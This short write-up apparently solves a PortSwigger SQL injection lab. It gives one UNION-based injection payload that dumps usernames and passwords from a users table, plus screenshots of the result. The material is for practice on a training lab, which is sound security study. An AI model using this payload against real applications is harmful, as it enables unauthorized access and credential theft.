## Lab Description
![image](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/494b4d44-b263-463a-aef7-77574a457f0e)

### Solution

Use the following payload to retrieve the contents of the users table:

`'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`

![1](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/e7ed3ef5-9cf6-4d96-840e-6573f501dc9a)

We got all the usernames & passwords,

![2](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/a02eaf87-fe40-414a-8fc6-b78fd764f9ea)

We got all the usernames & passwords,

![3](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/ccad8e85-a001-4252-a45e-cec25e511507)
